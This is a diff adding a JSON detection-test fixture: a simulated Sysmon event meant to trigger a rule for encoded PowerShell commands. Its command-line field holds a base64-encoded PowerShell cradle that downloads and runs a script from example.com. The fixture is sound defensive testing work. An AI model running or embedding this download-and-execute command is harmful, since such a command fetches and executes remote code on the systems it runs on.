@@ -1,0 +1,20 @@
+{
+  "detection_id": "DET-002",
+  "technique": "T1059.001",
+  "name": "PowerShell Encoded Command",
+  "expect_rule": "100005",
+  "event": {
+    "win": {
+      "system": {
+        "providerName": "Microsoft-Windows-Sysmon",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "severityValue": "INFORMATION",
+        "eventID": 1
+      },
+      "eventdata": {
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "commandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AdABlAHMAdAAnACkA"
+      }
+    }
+  }
+}
